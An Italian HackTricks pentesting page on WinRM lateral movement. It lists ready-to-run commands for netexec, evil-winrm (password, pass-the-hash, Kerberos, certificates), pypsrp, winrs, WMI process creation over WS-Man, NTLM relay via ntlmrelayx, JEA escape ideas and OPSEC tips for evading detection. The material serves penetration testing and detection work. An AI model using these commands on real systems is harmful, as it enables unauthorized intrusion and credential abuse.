# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM è uno dei trasporti di **lateral movement** più pratici negli ambienti Windows, perché fornisce una shell remota tramite **WS-Man/HTTP(S)** senza dover ricorrere a tecniche di creazione di servizi SMB. Se il target espone **5985/5986** e il tuo principal è autorizzato a usare il remoting, spesso puoi passare rapidamente da "credenziali valide" a "shell interattiva".

Per l’enumerazione di **protocollo/servizio**, i listener, l’abilitazione di WinRM, `Invoke-Command` e l’uso generico del client, consulta:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Perché gli operatori apprezzano WinRM

- Usa **HTTP/HTTPS** invece di SMB/RPC, quindi spesso funziona dove l’esecuzione in stile PsExec è bloccata.
- Con **Kerberos**, evita di inviare credenziali riutilizzabili al target.
- Funziona bene con strumenti per **Windows**, **Linux** e **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Il percorso interattivo di PowerShell remoting avvia **`wsmprovhost.exe`** sul target nel contesto dell’utente autenticato, un comportamento operativo diverso dall’esecuzione basata su servizi.

## Modello di accesso e prerequisiti

In pratica, il successo del lateral movement tramite WinRM dipende da **tre** fattori:

1. Il target dispone di un **listener WinRM** (`5985`/`5986`) e di regole firewall che consentono l’accesso.
2. L’account può **autenticarsi** all’endpoint.
3. L’account è autorizzato ad **aprire una sessione di remoting**.

Modi comuni per ottenere tale accesso:

- **Amministratore locale** sul target.
- Appartenenza al gruppo **Remote Management Users** nei sistemi più recenti o a **WinRMRemoteWMIUsers__** nei sistemi/componenti che continuano a riconoscere quel gruppo.
- Diritti di remoting delegati esplicitamente tramite descrittori di sicurezza locali / modifiche alle ACL di PowerShell remoting.

Se hai già il controllo di una macchina con diritti di amministratore, ricorda che puoi anche **delegare l’accesso a WinRM senza appartenere al gruppo degli amministratori** usando le tecniche descritte qui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Aspetti dell’autenticazione da considerare durante il lateral movement

- **Kerberos richiede un hostname/FQDN**. Se ti connetti tramite IP, il client in genere ripiega su **NTLM/Negotiate**.
- Nei casi di **workgroup** o di trust tra domini, NTLM richiede comunemente **HTTPS** oppure che il target venga aggiunto a **TrustedHosts** sul client.
- Con account locali tramite Negotiate in un workgroup, le restrizioni UAC remote possono impedire l’accesso, a meno che non venga usato l’account Administrator predefinito o impostato `LocalAccountTokenFilterPolicy=1`.
- Per impostazione predefinita, PowerShell remoting usa lo **SPN `HTTP/<host>`**. Negli ambienti in cui `HTTP/<host>` è già registrato per un altro account di servizio, Kerberos di WinRM può non funzionare con `0x80090322`; usa uno SPN che includa la porta oppure passa a **`WSMAN/<host>`** se tale SPN è presente.<sup>[[3]](#references)</sup>

Se ottieni credenziali valide durante un password spraying, verificarle tramite WinRM è spesso il modo più rapido per controllare se consentono di ottenere una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement da Linux a Windows

### NetExec / CrackMapExec per la verifica e l’esecuzione one-shot

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM per shell interattive

`evil-winrm` rimane l’opzione interattiva più comoda da Linux perché supporta **password**, **hash NT**, **ticket Kerberos**, **certificati client**, il trasferimento di file e il caricamento in memoria di PowerShell/.NET.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Caso limite Kerberos SPN: `HTTP` vs `WSMAN`

Quando lo SPN predefinito **`HTTP/<host>`** causa errori Kerberos, prova invece a richiedere/usare un ticket **`WSMAN/<host>`**. Questo può verificarsi in ambienti aziendali con configurazioni particolarmente rigide o anomale, dove **`HTTP/<host>`** è già associato a un altro account di servizio.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Questo è utile anche dopo l'abuso di **RBCD / S4U** quando hai creato o richiesto specificamente un service ticket **WSMAN**, anziché un ticket generico `HTTP`.

### Autenticazione basata su certificati

WinRM supporta anche l'**autenticazione con certificato client**, ma il certificato deve essere mappato sul target a un **account locale**. Dal punto di vista offensivo, questo è importante quando:

- hai sottratto/esportato un certificato client valido e la relativa chiave privata, già mappati per WinRM;
- hai abusato di **AD CS / Pass-the-Certificate** per ottenere un certificato per un principal e poi passare a un altro percorso di autenticazione;
- operi in ambienti che evitano deliberatamente il remoting basato su password.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

WinRM con certificato client è molto meno comune dell'autenticazione con password/hash/Kerberos, ma quando è presente può offrire un percorso di **lateral movement** senza password che persiste anche dopo la rotazione della password.

### Python / automazione con `pypsrp`

Se ti serve automazione invece di una shell per l'operatore, `pypsrp` fornisce WinRM/PSRP da Python con supporto per **NTLM**, **autenticazione con certificato**, **Kerberos** e **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Se hai bisogno di un controllo più preciso rispetto al wrapper di alto livello `Client`, le API di livello inferiore `WSMan` + `RunspacePool` sono utili per due problemi operativi comuni:

- forzare **`WSMAN`** come servizio/SPN Kerberos invece dell'aspettativa predefinita **`HTTP`** usata da molti client PowerShell;
- connettersi a un endpoint PSRP non predefinito, come una configurazione di sessione **JEA** / personalizzata, invece di `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Gli endpoint PSRP personalizzati e JEA sono importanti durante il lateral movement

Un'autenticazione WinRM riuscita **non** significa sempre che si acceda all'endpoint predefinito senza restrizioni `Microsoft.PowerShell`. Gli ambienti maturi possono esporre **configurazioni di sessione personalizzate** o endpoint **JEA** con ACL e comportamento run-as propri.<sup>[[1]](#references)</sup>

Se hai già code execution su un host Windows e vuoi capire quali superfici di remoting sono disponibili, enumera gli endpoint registrati:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Quando esiste un endpoint utile, punta esplicitamente a quello invece di usare la shell predefinita:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Implicazioni pratiche offensive:

- Un endpoint **restricted** può comunque bastare per il lateral movement se espone solo i cmdlet/le funzioni giusti per il controllo dei servizi, l'accesso ai file, la creazione di processi o l'esecuzione di comandi .NET / esterni arbitrari.
- Un ruolo **JEA misconfigured** è particolarmente utile quando espone comandi pericolosi come `Start-Process`, wildcard ampie, provider scrivibili o funzioni proxy personalizzate che consentono di evadere le restrizioni previste.
- Gli endpoint basati su account virtuali **RunAs** o **gMSA** modificano il contesto di sicurezza effettivo dei comandi eseguiti. In particolare, un endpoint basato su gMSA può fornire un'**identità di rete al secondo hop**, anche quando una normale sessione WinRM incontra il classico problema di delega.

Per un endpoint personalizzato restricted, esamina separatamente i comandi effettivamente disponibili e le autorizzazioni sugli script: un breve elenco `Get-Command` non dimostra da solo che uno script `.ps1` esistente non possa essere eseguito. [Le funzionalità dei ruoli JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) controllano esplicitamente quali percorsi degli script possono essere invocati; altri endpoint personalizzati possono applicare regole di sessione diverse. Se uno script consentito usa un `SecureString` archiviato per creare credenziali per un altro host, un blob creato senza una chiave esplicita usa [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) e in genere richiede il contesto dell'utente e del computer che lo proteggono per essere decrittato. Prima di considerare il codice sorgente scrivibile o un blob copiato come un percorso di escalation cross-host, verifica l'ACL dello script, le modalità di invocazione consentite, l'identità RunAs e i diritti sulle credenziali a valle. Non visualizzare il valore protetto durante l'enumerazione passiva.

Per una funzione personalizzata JEA che accetta un percorso di file, esamina insieme l'ACL dell'endpoint registrato, la funzionalità di ruolo associata e l'identità RunAs effettiva. Un chiamante può avere `NoLanguage` mentre il corpo della funzione viene eseguito nella modalità linguaggio predefinita del sistema; inoltre, un account virtuale può avere privilegi di amministratore locale. Se la funzione controlla una directory consentita con un semplice prefisso di stringa e poi legge il percorso fornito, i componenti `..` possono risolversi al di fuori di tale directory. Il confine è il percorso risolto nell'identità della funzione, non la modalità linguaggio del chiamante né il prefisso apparente. Verifica che la funzione sia raggiungibile e che il percorso finale venga convalidato prima di considerare un file `.psrc` o `.pssc` leggibile come una vulnerabilità di lettura di file privilegiata. Consulta le indicazioni Microsoft sulle [funzionalità dei ruoli JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) e sulle [considerazioni di sicurezza](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Lateral movement con WinRM nativo di Windows

### `winrs.exe`

`winrs.exe` è incluso nel sistema ed è utile quando vuoi **eseguire comandi tramite WinRM nativo** senza aprire una sessione interattiva di PowerShell remoting:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Due flag sono facili da dimenticare e importanti nella pratica:

- `/noprofile` è spesso necessario quando il principal remoto **non** è un amministratore locale.
- `/allowdelegate` consente alla shell remota di usare le tue credenziali verso un **terzo host** (ad esempio, quando il comando deve accedere a `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

A livello operativo, `winrs.exe` genera comunemente una catena di processi remoti simile a:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

È importante ricordarlo, perché è diverso dall'`exec` basato su servizi e dalle sessioni PSRP interattive.

### `winrm.cmd` / WS-Man COM invece di PowerShell remoting

Puoi anche eseguire comandi tramite il **trasporto WinRM** senza usare `Enter-PSSession`, richiamando classi WMI tramite WS-Man. In questo modo il trasporto resta WinRM, mentre il meccanismo di esecuzione remota diventa **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Questo approccio è utile quando:

- Il logging di PowerShell è monitorato attentamente.
- Vuoi usare il **trasporto WinRM** senza seguire il classico workflow di PS remoting.
- Stai sviluppando o utilizzando strumenti personalizzati basati sull'oggetto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Quando il relay SMB è bloccato dalla firma e il relay LDAP è limitato, **WS-Man/WinRM** può comunque essere un target interessante per il relay. Le versioni moderne di `ntlmrelayx.py` includono **server di relay WinRM** e possono eseguire relay verso target **`wsman://`** o **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Due note pratiche:

- Relay è più utile quando il target accetta **NTLM** e il principal inoltrato è autorizzato a usare WinRM.
- Il codice recente di Impacket gestisce in modo specifico le richieste **`WSMANIDENTIFY: unauthenticated`**, così le probe in stile `Test-WSMan` non interrompono il flusso di relay.

Per i vincoli multi-hop dopo aver ottenuto una prima sessione WinRM, consulta:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Note su OPSEC e rilevamento

- **L'interazione remota di PowerShell** in genere crea **`wsmprovhost.exe`** sul target.
- **`winrs.exe`** crea comunemente **`winrshost.exe`** e poi il processo figlio richiesto.
- Gli endpoint **JEA** personalizzati possono eseguire azioni come account virtuali **`WinRM_VA_*`** o come **gMSA** configurati, modificando sia la telemetria sia il comportamento del secondo hop rispetto a una shell nel contesto di un utente normale.<sup>[[1]](#references)</sup>
- Se usi PSRP anziché `cmd.exe` grezzo, aspettati telemetria di **accesso di rete**, eventi del servizio WinRM e logging operativo/script block di PowerShell.
- Se ti serve un solo comando, `winrs.exe` o l'esecuzione WinRM one-shot possono essere più discrete di una sessione di remoting interattiva di lunga durata.
- Se Kerberos è disponibile, preferisci **FQDN + Kerberos** invece di IP + NTLM per ridurre sia i problemi di trust sia le modifiche scomode a `TrustedHosts` lato client.

## References

- [1] [Microsoft: Considerazioni sulla sicurezza di JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Errore `0x80090322` durante la connessione di PowerShell a un server remoto tramite WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
